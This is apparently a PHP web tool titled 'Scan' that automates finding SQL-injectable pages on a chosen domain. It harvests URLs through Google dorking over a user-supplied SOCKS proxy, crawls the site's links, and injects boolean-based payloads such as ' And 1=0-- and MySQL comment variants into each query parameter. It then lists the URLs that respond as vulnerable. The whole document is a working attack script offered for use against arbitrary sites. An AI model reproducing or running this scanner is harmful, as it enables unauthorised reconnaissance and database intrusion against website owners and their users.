<title>Scan</title>
<form action="" method="POST" name="form">
<table>
<tr><td><div class="input"> Domain </div></td>
<td><input type="text" name="site" size="70" />
<select name="filetype">
	<option value="php" selected>php</option>
	<option value="asp">asp</option>
	<option value="aspx">aspx</option>
	<option value="cfm">cfm</option>
	<option value="cgi">cgi</option>
	<option value="html">html</option>
	<option value="htm">htm</option>
</select></td></tr>
<tr><td><div class="input"> Sock </div></td><td><input type="text" name="sock" />
<input type="submit" name="submit" value="check" /></td></tr>
</table>
</form>

<p>
<div class="input">
=========================<br>
tool scan <br>
=========================<br>
Can not scan https site<br>
</div>
<p>

<?php
	
	@set_time_limit(0);
	
	require("function_class.php");
	function check_sql_injection($url)
	{
		$pos[0]=strpos($url,"&");$i=1;
		while($pos[$i]=strpos($url,"&",$pos[$i-1]+1))
		{
			$i=$i+1;
		}
		$array_url[0]=stripslashes($url."'");$i=1;
		while(!$pos[$i-1]=="")
		{
			$temp2=substr($url,$pos[$i-1]);
			$temp1=substr_replace($url,"'",$pos[$i-1]);
			$array_url[$i]=stripslashes($temp1.$temp2);
			$i=$i+1;
		}
		$i=0;
		while(!$array_url[$i]=="")
		{
			$page = strtolower(cleanUpPage(getPage($array_url[$i])));
			if(strpos($page,"sql"))
			{
				echo "<a href=\"".$array_url[$i]."\" target=\"_blank\">".$array_url[$i]."</a> => <font color='red'>sql</font><br>";ob_flush();flush();
				$i=$i+1;
			}
			else
			{
				if($page != cleanUpPage(getPage(str_replace("'","",$array_url[$i]))))
				{
					$checks = array(
					array("%20And%201=0--","%20And%201=1--","%20And%202=2--"),
					array("%20'%20And%201=0+--+","%20'%20And%201=1+--+","%20'%20And%202=2+--+"),
					array("%20/*!%20And%201=0*/--","%20/*!%20And%201=1*/--","%20/*!%20And%202=2*/--"),
					array("%20'/*!%20And%201=0*/+--+","%20'/*!%20And%201=1*/+--+","%20'/*!%20And%202=2*/+--+"));
					foreach($checks as $check)
					{
						$a = explode("vndarkcode",cleanUpPage(getPage(str_replace("'",$check[0],$array_url[$i]))));

						$b = explode("vndarkcode",cleanUpPage(getPage(str_replace("'",$check[1],$array_url[$i]))));

						$c = explode("vndarkcode",cleanUpPage(getPage(str_replace("'",$check[2],$array_url[$i]))));
						
						$d = 0;
						for($k=0;$k<=count($a);$k++)
						{
							if(($a[$k] != $b[$k]) && ($b[$k] == $c[$k]))
								$d++;
						}


						if($d > 5)
						{
							echo "<a href=\"".str_replace("'",$check[0],$array_url[$i])."\" target=\"_blank\">".str_replace("'",$check[0],$array_url[$i])."</a> => <font color='orange'>sql</font><br>";ob_flush();flush();
							$ok = 1;
							break;
						}
					}
					if(!$ok)
					{
						echo $array_url[$i]."<br>";ob_flush();flush();
					}
					$ok = 0;
				}
				else
				{
					echo $array_url[$i]."<br>";ob_flush();flush();
				}
			}
			$i=$i+1;
			ob_flush();flush();
		}
	}
	function alexa($domain)
	{
		$page=get_page2("http://www.alexa.com/search?q=".$domain."&r=home_home&p=bigtop","");
		$page=str_replace("\n","",$page);
		preg_match("/Alexa[\s]Traffic[\s]Rank:(.*?)\/a\>/",$page,$tmp);
		preg_match("/\"\>(.*)\</",$tmp[1],$result);
		return $result[1];
	}
	function get_page1($url)
	{
		$ch=curl_init();
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		//$agent = "Mozilla/5.0 (Windows; ?; Windows NT 5.1; *rv:*) Gecko/* Firefox/0.9*";
		//curl_setopt($ch,CURLOPT_USERAGENT,$agent);
		//curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
		//curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
		curl_setopt($ch,CURLOPT_URL,$url);
		curl_setopt($ch,CURLOPT_TIMEOUT,10);
		$page=curl_exec($ch);
		curl_close($ch);
		return $page;
	}
	function get_page2($url)
	{
		$ch=curl_init();
		$proxy=$_REQUEST["sock"];
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		if($proxy)
		{
			curl_setopt($ch,CURLOPT_PROXY,trim($proxy));
			curl_setopt($ch,CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);
			curl_setopt($ch,CURLOPT_HTTPPROXYTUNNEL,1);
		}
		//$agent = "Mozilla/5.0 (Windows; ?; Windows NT 5.1; *rv:*) Gecko/* Firefox/0.9*";
		//curl_setopt($ch,CURLOPT_USERAGENT,$agent);
		//curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
		//curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
		curl_setopt($ch,CURLOPT_URL,$url);
		curl_setopt($ch,CURLOPT_TIMEOUT,10);
		$page=curl_exec($ch);
		curl_close($ch);
		return $page;
	}
	if(isset($_REQUEST["site"]) && isset($_REQUEST["filetype"]))
	{
	//exit("disabled");
		$site=trim(strtolower($_REQUEST["site"]));
		$site=str_replace("http://","",$site);
		$site=str_replace("www.","",$site);
		$filetype=$_REQUEST["filetype"];
		$keyword="site:".$site."+filetype:".$filetype;
		$line[0]=1;$k=0;$blacklist[0]=1;$all_file[0]="http://".$site."/";$all=1;$end=1;
		echo "alexa rank : ".alexa($site)."<br>";ob_flush();flush();
		while($end<=4)
		{
			$url="http://www.google.com/search?q=".$keyword."&start=0&num=100";//exit($url);
			$page=get_page2($url);
			if(strpos($page,"did not match any documents")==true) 
			{
				break ;
			}
			if(strpos($page,"http://www.google.com/support/websearch/bin/answer.py?answer=86640")==true || strpos($page,"302 Moved")==true) 
			{ 
				echo "<font color='red'>CHANGE SOCK PLEASE</font>";
				exit ;
			}
			preg_match_all("/a href=\"http:\/\/(.*?)\"/",$page,$line);
			$i=0;
			while($line[1][$i]!="")
			{
				if(!preg_match("/google.com|youtube.com|cache|alexa.com|search\?/",$line[1][$i]))
				{
					if(!preg_match("/\?/",$line[1][$i]))
					{
						preg_match("/\/(.*?)\./",$line[1][$i],$file);
						$keyword=$keyword."+-".$file[1].".".$filetype;
						echo $line[1][$i]="http://".$line[1][$i]."<br>";ob_flush();flush();
						if(!in_array($line[1][$i],$all_file))
						{
							$all_file[$all]=$line[1][$i];$all=$all+1;
						}
					}
					else
					{
						preg_match("/\/(.*?)\./",$line[1][$i],$file);
						if(!in_array($file[1],$blacklist))
						{
							check_sql_injection("http://".$line[1][$i],"'");
							$keyword=$keyword."+-".$file[1].".".$filetype;
							$blacklist[$k]=$file[1];$k=$k+1;
							$temp="http://".$site."/".$file[1].".".$filetype;
							if(!in_array($line[1][$i],$all_file))
							{
								$all_file[$all]="http://".$line[1][$i];$all=$all+1;
								$all_file[$all]=$temp;$all=$all+1;
							}
						}
					}
					ob_flush();flush();
				}
			$i=$i+1;
			ob_flush();flush();
			}
		$end=$end+1;
		ob_flush();flush();
		}
		echo "=====================================<br>";
    	$h=0;
		if($all_file[1]=="")
		{
			echo "<font color='red'>Error : change sock , check filetype in your URL [ filetype=???&sock=??? ]</font><br>";
			exit;
		}
		while($all_file[$h]!="")
		{
			$page=get_page1($all_file[$h]);
			preg_match_all("/a href=\"(.*?)\"/",$page,$line);
			$i=0;
			while($line[1][$i]!="")
			{
				if(!preg_match("/google.com|youtube.com|cache|alexa.com|search|ymsgr|mailto|javascript|\#/",$line[1][$i]))
				{
					if(!preg_match("/\?/",$line[1][$i]))
					{
						if(preg_match("/http/",$line[1][$i]) && preg_match("/".$site."/",$line[1][$i]) && !in_array($line[1][$i],$all_file))
						{
							$temp=str_replace("http://","",$line[1][$i]);
							$temp=str_replace("www.","",$temp);
							$temp=str_replace("/","",$temp);
							$temp=str_replace($site,"",$temp);
							if($temp=="")
							{
								$g=0;
							}
							else
							{
								echo $line[1][$i]."<br>";
								$all_file[$all]=$line[1][$i];$all=$all+1;
							}
						}
						elseif(!preg_match("/http/",$line[1][$i]) && preg_match("/".$site."/",$line[1][$i]) && !in_array("http://".$line[1][$i],$all_file))
						{
							$temp=str_replace("www.","",$line[1][$i]);
							$temp=str_replace("/","",$temp);
							$temp=str_replace($site,"",$temp);
							if($temp=="")
							{
								$g=0;
							}
							else
							{
								echo "http://".$line[1][$i]."<br>";
								$all_file[$all]="http://".$line[1][$i];$all=$all+1;
							}
						}
						elseif(!preg_match("/http/",$line[1][$i]) && !preg_match("/".$site."/",$line[1][$i]))
						{
							$pos=strrpos($all_file[$h],"/");
							$line[1][$i]=substr_replace($all_file[$h],"/".$line[1][$i],$pos);
							if(!in_array($line[1][$i],$all_file))
							{
								echo $line[1][$i]."<br>";
								$all_file[$all]=$line[1][$i];$all=$all+1;
							}

						}
					}
					else
					{
						if(preg_match("/http/",$line[1][$i]) && preg_match("/".$site."/",$line[1][$i]))
						{
							$temp=$line[1][$i];
							$line[1][$i]=str_replace(strrchr($line[1][$i],"?"),"",$line[1][$i]);
							if(!in_array($line[1][$i],$all_file))
							{
								check_sql_injection($temp);
								$all_file[$all]=$temp;$all=$all+1;
								$all_file[$all]=$line[1][$i];$all=$all+1;
							}
						}
						elseif(!preg_match("/http/",$line[1][$i]) && preg_match("/".$site."/",$line[1][$i]))
						{
							$line[1][$i]="http://".$line[1][$i];
							$temp=$line[1][$i];
							$line[1][$i]=str_replace(strrchr($line[1][$i],"?"),"",$line[1][$i]);
							if(!in_array($line[1][$i],$all_file))
							{
								check_sql_injection($temp);
								$all_file[$all]=$temp;$all=$all+1;
								$all_file[$all]=$line[1][$i];$all=$all+1;
							}
						}
						elseif(!preg_match("/http/",$line[1][$i]) && !preg_match("/".$site."/",$line[1][$i]))
						{
							$pos=strrpos($all_file[$h],"/");
							$temp=substr_replace($all_file[$h],"/".$line[1][$i],$pos);
							$line[1][$i]=str_replace(strrchr($line[1][$i],"?"),"",$line[1][$i]);
							$line[1][$i]=substr_replace($all_file[$h],"/".$line[1][$i],$pos);
							if(!in_array($line[1][$i],$all_file))
							{
								check_sql_injection($temp);
								$all_file[$all]=$temp;$all=$all+1;
								$all_file[$all]=$line[1][$i];$all=$all+1;
							}
						}
					}
				}
				ob_flush();flush();
				$i=$i+1;
			}	
			$h=$h+1;
			ob_flush();flush();
		}	
		echo "DONE";
	}
		
?>